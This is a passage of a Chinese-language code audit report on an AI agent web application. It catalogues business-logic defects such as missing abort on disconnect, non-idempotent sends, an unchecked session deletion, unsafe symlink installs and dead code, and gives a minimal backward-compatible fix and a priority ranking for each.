- 修复（最小+兼容）：`plugins/route.ts` 的 `enable/disable` 开头读 `readPluginMasterState().enabled`，总闸关闭时拒绝单包写（返回 409 或自动并入 snapshot）；旧 settings.json 数据无需迁移，仅加 guard。

#### L3 [严重] 会话 DELETE 级联 re-parent 用绝对路径做外键，跨重命名失效/误挂

- 文件：`app/api/sessions/[id]/route.ts:246-262`、`lib/rpc-manager.ts:147-173`（`setSessionParent` 写绝对路径）、`lib/session-reparent.ts`。
- 代码：删除时扫描同目录 `.jsonl`，以 `header.parentSession === filePath`（绝对路径字符串）识别直接子节点，再 `reparentSessionHeader(content, parentSessionPath)` 挂到祖父绝对路径。
- 违反原则：父子关系用**可变绝对路径**作稳定外键，违背“外键应稳定”原则。
- 业务后果：**数据完整性损坏**——会话文件移动/重命名/跨 worktree 后匹配全部失效，子会话变孤儿（UI 无法导航）；fork 场景下多兄弟 `parentSession` 指向同一绝对路径，删除任一会把无关分支误并入另一树。
- 修复（最小+兼容旧数据）：父子关系改用 session id（稳定）；re-parent 按 id 解析回当前路径；兼容旧数据用 `parentSessionPath` 反查 id 的迁移层（读旧路径→解析 id→按 id 重挂），不改历史文件格式。

#### L4 [一般] set_tools 全关再开部分工具，forceEmptySystemPrompt 未对齐

- 文件：`lib/rpc-manager.ts:585-594`（`set_tools`：`setForceEmptySystemPrompt(toolNames.length===0)`）、`rpc-manager.ts:1088-1093`。
- 代码：`length===0` 时置 true，`length>0` 时未显式置回 false，依赖 `applyForcedEmptySystemPrompt()` 仅当标志为真才清空。
- 违反原则：派生状态（系统提示词是否被清空）与权威开关在“重新开启”路径未对齐。
- 业务后果：边缘情况下“全关再开部分工具”残留空系统提示词，agent 缺身份/工具约束，行为异常（客诉）。
- 修复（最小+兼容）：`set_tools` 在 `length>0` 分支显式 `setForceEmptySystemPrompt(false)` 后再 apply；旧会话行为不变。

#### L5 [一般] optimize 依赖校验晚于 LLM 调用，无凭证时模糊 500

- 文件：`app/api/agents-md/optimize/route.ts:29-34,55-84`（先 `content` 校验，后 `resolveDefaultModelCredentials`，失败走 `errorResponse(error)`→500）。
- 代码：参数校验顺序不当——依赖缺失（无 model/apiKey）直到 `completeSimple` 才暴露。
- 违反原则：前置依赖缺失应早于“调用外部/计费操作”被发现并给清晰错误。
- 业务后果：空内容/无凭证时用户得到模糊 500 或 “AI returned empty content”，**客诉定位困难**（与 C1 同源，此处强调业务体验）。
- 修复（最小+兼容）：`content` 校验后、调用 LLM 前先校验 `model && apiKey` 存在，缺失返回 400 并指明“需先配置 provider”；与 C1 的 `ModelCredentialsError` 一并落地。

#### L6 [建议] /api/todos 恒空、/api/task-list 才是真源，空壳死接口

- 文件：`app/api/todos/route.ts:17`（`return {tasks:[], entryCount:entries.length}`）、`app/api/task-list/route.ts:73`、`components/TodoPanel.tsx:41`（只调 task-list）。
- 代码：同名语义两端点行为分裂，其一永远返回空。
- 违反原则：单一职责 + 接口语义一致性。
- 业务后果：外部/误调 `/api/todos` 显示空待办（**客诉/数据误读**）；冗余死接口增加维护歧义。
- 修复（最小+兼容）：废弃 `/api/todos`（返回 410 或 301 到 task-list），或内部代理；不删历史调用方（当前仅前端用 task-list）。

#### L23 [一般] pause 仅协同式检查，长任务阶段内 pause 无效（暂停失灵）

- 文件：`lib/unified-engine/unified-engine-runtime.ts:239-246`（`pauseRun` 仅落 `status="paused"`）、`lib/autoplan-loop-service.ts:130,159,167,205`（`shouldPause` 仅在阶段间隙轮询）；`buildStage:175-216` 用 `Promise.all` 并发且无阶段内检查点。
- 代码：暂停请求在大任务运行中会被忽略数分钟。
- 违反原则：暂停语义要求“尽快冻结可控资源”，非“下个阶段才生效”。
- 业务后果：用户点暂停后引擎仍跑高成本任务，体验上“暂停失灵”，被理解为功能失控/资损不可控。
- 修复（最小+兼容）：在 `buildStage` 任务提交前/循环插入细粒度 `shouldPause` 校验，并让 `pauseRun` 设置阶段内可读取的暂停标志；旧 paused 状态语义不变。

---

### 7.2 缺失场景与用例漏洞（非正路径 / 批量操作）

#### L7 [严重] SSE 断开/关页后服务端 Agent 仍跑烧 token（无断开即 abort）

- 文件：`app/api/agent/[id]/events/route.ts:50-57`（cleanup 仅 `unsubscribe()+controller.close()`，未调 `abort()`）、`lib/rpc-manager.ts:77,312-318`（空闲回收最长 10min）。
- 代码：`req.signal` abort 时仅关流，不中止 `isRunning()` 的 session。
- 违反原则：用户显性离开应终止关联资源消耗。
- 业务后果：**资损**——关闭标签页/刷新/切后台后 LLM 持续计费，长 thinking 下可达 10 分钟。
- 修复（最小+兼容）：events route cleanup 中若 `session.isRunning()` 则 `session.send({type:"abort"})`（复用 destroy 内 abort 行为）；旧前端无需改动。

#### L8 [严重] 重复点击发送不幂等，同 prompt 双发 LLM

- 文件：`hooks/useSessionActions.ts:51-55`（`if (stream.agentRunning) return;` 防重，但 `agentRunning` 置位在 `sendAgentCommand` 之前且中间有异步 await）、`lib/rpc-manager.ts:333-377`（`prompt` 分支无幂等键，直接 fire-and-forget）。
- 代码：用户在 `agentRunning` 翻转前连点，或 `ensureEventsConnected` 超时仍 proceed，会进入两次 `sendAgentCommand`。
- 违反原则：关键写操作需幂等/乐观锁。
- 业务后果：**资损+脏数据**——同一消息被执行两次（双发工具调用、双写文件）；**客诉**。
- 修复（最小+兼容）：前端发送前用 `ref` 锁（而非依赖异步状态翻转）；服务端 `prompt` 分支以 `message+会话+时间窗` 生成幂等键去重（复用现有 `promptRunning` 扩展为“上一条 message hash 未变则不重投”）。

#### L9 [严重] fork 在 running 中直接 destroy，丢失进行中 run

- 文件：`lib/rpc-manager.ts:430-466`（`fork` 分支无 `promptRunning` 守卫，直接 `this.destroy()`）、`hooks/useSessionActions.ts:175`（`handleFork` 未在 `agentRunning` 时禁用）。
- 代码：`destroy()` 内 `inner.abort?.()` 强制中止当前 prompt，新建分支基于 fork 点 entry 复制。
- 违反原则：耗时操作并发需互斥或确认。
- 业务后果：用户意外丢失正在生成的长回复；分支内容不完整引发困惑/客诉。
- 修复（最小+兼容）：`fork` 分支若 `promptRunning` 为真，先 `await inner.abort()` 完成（或返回 `{cancelled:true}` 让前端提示“请先停止”），再 destroy；旧分支文件格式不变。

#### L10 [严重] 会话 DELETE 无归属校验，可直接调 API 删任意会话

- 文件：`app/api/sessions/[id]/route.ts:226-280`（`resolveSessionPath(id)` 后直接 `unlinkSync`，无 owner/cwd/project 校验）。
- 代码：与安全 S1 同源（无认证层），此处强调业务：只要知道 session id（或直接调 API 跳过前端）即可删除任意会话。
- 违反原则：删除他人资源前须校验归属/权限。
- 业务后果：**越权删除、数据丢失**；若后续补“批量删除”接口将直接放大为批量越权删除（资损/客诉）。
- 修复（最小+兼容）：DELETE 增加归属校验（cwd/owner 与当前用户匹配）；引入批量删除时逐条校验 + 事务式回滚（任一失败整体不删）。与 S1 的 token 层解耦，但业务 guard 独立存在。

#### L11 [高] 批量启用 prompt 模块无事务，部分成功状态分裂

- 文件：`app/api/prompts/modules/route.ts:51-89`（`findManagedModule(id)` 校验存在；`setModuleEnabled` 逐条写全局状态，无锁/无事务）。
- 代码：单条有 `findManagedModule` 校验，但批量逐条调用时若中间抛错（并发写同一状态文件），前几条已生效、后几条未生效，状态分裂；模块状态文件全局共享无锁。
- 违反原则：批量写需“全有或全无” + 每条 id 预校验。
- 业务后果：部分模块启用成功、部分失败，系统提示词配置处不一致态，难排查。
- 修复（最小+兼容）：批量启用先对全部 id 做 `findManagedModule` 校验再统一写；用文件锁/原子写保证一致性；旧单条接口行为不变。

#### L12 [中] MCP 整文件覆盖 PUT，并发/不完整提交丢失 server 配置

- 文件：`app/api/mcp-config/route.ts:81-113`（`writeJsonFileAtomic` 整份覆盖；`...existing` 合并依赖客户端完整提交）。
- 代码：校验通过即整文件覆盖；客户端传“合并后不完整对象”或两次并发 PUT 会以“最后一次覆盖”丢失前一次 server。
- 违反原则：整文件覆盖需读-改-写原子 + 版本乐观锁。
- 业务后果：用户误删/覆盖 MCP server 配置，agent 工具链断裂（客诉）。
- 修复（最小+兼容）：改单 server 增删改接口，或对整 PATCH 引入 `If-Match` 版本号乐观锁；旧整文件格式仍兼容。

#### L13 [中] extension install 失败不回滚 symlink，sourcePath 未白名单

- 文件：`lib/extensions/discovery.ts:248-280`（`installLocalExtension` 循环 `symlinkSync`，失败无回滚；`isSafeRelativePath` 只用于 module 字段，不用于 `sourcePath`）。
- 代码：多 entry 中第二个 `symlinkSync` 抛错时，第一个 symlink 已建且不回滚；`uninstallExtension` 仅 `rmSync(extDir/id)` 删第一个 id。
- 违反原则：部分成功的批量操作须补偿回滚；安装源须白名单/边界校验（与安全 S5 同源，此处强调**补偿缺失**）。
- 业务后果：残留孤儿 symlink 指向不存在/敏感目录；卸载不净。（多用户部署下即 S5 的 RCE。）
- 修复（最小+兼容）：symlink 前校验 `sourcePath` 位于 project/允许用户目录内且不在 agentDir 外；循环中 try 包裹，失败则 `rmSync` 已建全部 symlink 后抛错；旧已装扩展不受影响。

#### L14 [中] optimize 超时(60s)后无原 content 补偿，前端内容可能丢失

- 文件：`app/api/agents-md/optimize/route.ts:12,55-84`（`completeSimple` `timeoutMs:60_000, maxRetries:0`；超时走 `errorResponse`，不返回原 content）。
- 代码：优化前原始 `content` 已被前端调用前替换；超时/500 时路由侧无任何“保留草稿/返回原 content”补偿。
- 违反原则：不可逆转化失败时须可回退到原输入。
- 业务后果：用户 60s 内没拿到结果且原始 AGENTS.md 被覆盖，内容丢失（客诉/脏数据）。
- 修复（最小+兼容）：超时返回 `{ ok:false, original: content }` 让前端一键还原；或前端乐观保留原内容直到成功替换；旧成功路径不变。

---

### 7.3 冗余与过度设计（永不发生的场景 / 死代码 / 反直觉开关）

#### L15 [中] select-llm LLM 精排生产永不触发，死代码

- 文件：`lib/prompt-system/select-llm.ts:73`、`components/PromptsConfig.tsx:77`（`previewUseLlm` 默认 false 且页面无控件置 true）、`app/api/prompts/preview-select/route.ts:34`。
- 代码：`if (!opts.useLlmSelect) return {selected:heuristic.selected, skipped, usedLlm:false};` —— 生产调用处 `useLlmSelect` 恒来自默认 false 的预览开关。
- 违反原则：为“永远不发生”的场景预留抽象（`classifyModules` 30s 超时 LLM 调用 + JSON 解析回退整条分支永不执行）。
- 业务后果：认知负载高、零收益；维护者需理解永不可达的 LLM 分类能力。
- 修复（最小+兼容）：删除 `select-llm.ts` 的 `classifyModules`/`selectModulesAdaptive` 及 preview-select 中 `useLlmSelect` 分支；或至少将 `previewUseLlm` 默认改 true 并在 UI 暴露。不破坏 heuristic 主路径。

#### L16 [中] vendor/memory 双 autoplan 适配生产永不触达，死代码

- 文件：`lib/unified-engine/autoplan-adapter.ts:63-89,96-166,176-193`（`ENGINE_AUTOPLAN_VENDOR!=="1"`→null；`createMemoryAutoPlanAdapter` 仅当未注入 LLM 时）。
- 代码：正常组合根始终注入 `createPiLlmCompletion`，故 vendor/memory 两套均不可达，唯一生效 `createLlmAutoPlanAdapter`；`ENGINE_AUTOPLAN_VENDOR` 仓库内从未设置。
- 违反原则：为永不发生的降级路径保留两套完整实现。
- 业务后果：维护者需理解两套永不运行的实现；`createRequire` 动态加载/`webpackIgnore` 等仅在死分支出现。
- 修复（最小+兼容）：删除 `tryLoadVendorAutoPlan` 与 `createMemoryAutoPlanAdapter`，`createAutoPlanAdapter` 仅返回 `createLlmAutoPlanAdapter`；或在 `.env.example` 注明 `ENGINE_AUTOPLAN_VENDOR` 已废弃。

#### L17 [低中] ENGINE_REAL_VERIFY 反向语义（非0即开），认知负载

- 文件：`lib/unified-engine/comet-adapter.ts:50-51`、`lib/unified-engine/autoplan-adapter.ts:47`。
- 代码：`if (process.env.ENGINE_REAL_VERIFY !== "0") return; // 默认执行真实校验，仅 "0" 才写诚实存根`。
- 违反原则：负向命名 + 反向默认，运维无法从变量名推断默认行为。
- 业务后果：误设为 `false`/空时系统仍走真实校验，与预期相反（审计语义误导）。
- 修复（最小+兼容）：重命名为 `ENGINE_SKIP_REAL_VERIFY`（正向），更新所有引用与 `.env.example`；旧值 `="0"` 语义保留为“跳过”映射一段兼容期。

#### L18 [低] pruneStaleSessions 死函数未调用

- 文件：`lib/session-state-store.ts:127-134`（定义后全仓无调用；`recordActiveSession` 在 `rpc-manager.ts:1135` 被调用但从不调 prune）。
- 代码：`activeSessions` 只增不删（仅受 `MAX_ENTRIES=20` 自然截断），清理函数无入口。
- 违反原则：定义了清理机制却不接入，误导读者以为有清理。
- 业务后果：死代码 + 语义误导；已删会话项最多残留至被 20 条新活动挤出。
- 修复（最小+兼容）：删除 `pruneStaleSessions`，或在 `listAllSessions` 后接入（已有 `validIds` 来源）。

#### L19 [低] registerAutoPlanAdapter 测试专用未生产用，多余接缝

- 文件：`lib/unified-engine/autoplan-adapter.ts:197`（`registerAutoPlanAdapter`，仅测试用）、`lib/pi.ts:21`（`registerPiAdapter`，生产仅 `new SdkAdapter()` 一个实现）。
- 代码：可替换端口的“双 register 注入点”在生产从未使用。
- 违反原则：过度解耦（合理的 anti-corruption 层，但 autoplan 那套 register 是多余接缝）。
- 业务后果：理解成本。
- 修复（最小+兼容）：删除 `registerAutoPlanAdapter`，`getAutoPlanAdapter` 直接构造；`registerPiAdapter` 保留（生产确有价值）。

---

### 7.4 棕地历史数据一致性（旧数据误分类 / 清洗改变含义）

#### L20 [中] 未知 entry.type 静默丢弃，历史自定义类型误分类

- 文件：`lib/session-reader.ts:269-327`（`entryToUiMessage` 的 `default: return null`）。
- 代码：任何不在已知 4 种类型内的 entry 都 `return null`，不报错不展示；历史 jsonl 可能含 SDK 早期 `entry.type` 或 hook 写入的 `customType`。
- 违反原则：棕地历史数据应被识别/占位，而非静默丢弃。
- 业务后果：历史会话 UI 出现“对话缺口”（用户误以为消息丢失）；导出/报表 `messageCount` 与实际可见数不一致，**误导**。
- 修复（最小+兼容）：未知 `type` 落入 `entryToUiMessage` 时 `console.warn` 并在 UI 渲染占位提示（“未知条目已被隐藏”）；旧数据零改动，仅展示增强。

#### L21 [中] 历史 provider/model 旧名/空串未归一，token 统计失真

- 文件：`lib/types.ts:54-75`（`AssistantMessage.provider: string` 无约束）、`lib/token-usage.ts:71`（`SUPPORTED_TOKEN_USAGE_PROVIDERS` 精确匹配）、`lib/session-reader.ts:280-281`（`model: piCtx.model` 直接透传）。
- 代码：`provider` 为自由字符串，历史 jsonl 可能存旧名（如 `anthropic` vs 现 `claude`）或空串；`token-usage` 仅按精确匹配，旧名不被识别。
- 违反原则：历史枚举值应做映射/别名，而非当作独立分组或 unsupported。
- 业务后果：① 按 provider 聚合时旧名成独立分组，统计被稀释；② `token-usage/[provider]` 对旧名返回 `unsupported`，前端隐藏真实用量，**误导配额判断**。
- 修复（最小+兼容）：`buildSessionContext` 出口对 `model.provider` 做旧名→现名映射表（`anthropic→claude` 等）；`SUPPORTED_TOKEN_USAGE_PROVIDERS` 增加别名回查；旧数据原样保留，仅展示层归一。

#### L22 [低中] master snapshot 异常路径清空，历史禁用态不可逆丢失

- 文件：`lib/plugin-master-switch.ts:27`（`snapshot` 定义）、`app/api/plugins/master/route.ts:72-74`（恢复后 `state.snapshot = {}`）。
- 代码：恢复期间若 `setPackageDisabled` 未 `flush` 成功（异常），下次读 `enabled:true` 但 snapshot 已空，旧插件禁用状态永久丢失；且无迁移/回滚保护。
- 违反原则：状态恢复应是原子/可回滚的，异常路径不应破坏快照。
- 业务后果：用户重开总闸后发现此前手动禁用的插件被重新启用，**体验误导**（个性化设置丢失）。
- 修复（最小+兼容）：恢复成功后再清空 snapshot，或保留快照（加 `deprecated`）直到下次主动关闭；`try/finally` 保证 flush 失败时不破坏 `state.snapshot`；旧 `pi-web-plugin-master.json` 结构不变。

---

## 8. 业务逻辑破坏者·修复优先级（与既有路线图合并）

- **P0 资损/审计（发布前必修）**：L1（引擎终态重入）、L7（SSE 断开即 abort）、L8（发送幂等）、L9（fork 守卫）、L10（会话归属校验）。
- **P1 数据完整性/状态漂移**：L2（总闸×单包 guard）、L3（re-parent 改 session id 外键）、L11（批量模块事务）。
- **P2 体验/补偿/统计失真**：L5/L14（optimize 前置校验+原 content 补偿）、L12（MCP 乐观锁）、L13（symlink 回滚+白名单）、L20/L21（历史数据占位+provider 归一）、L22（snapshot 原子恢复）、L23（pause 细粒度）。
- **P3 冗余清理（绞杀者，非阻塞）**：L15/L16（删死 LLM/双适配分支）、L17（反向开关重命名）、L18/L19（删死函数/接缝）、L4/L6（set_tools 对齐、废 /api/todos）。

> 所有修复均遵循“最小侵入 + 兼容旧数据”：不删历史 jsonl/侧车字段、不改文件格式，只在读取/写入层做 guard/映射/占位。

<!-- PART4_END -->
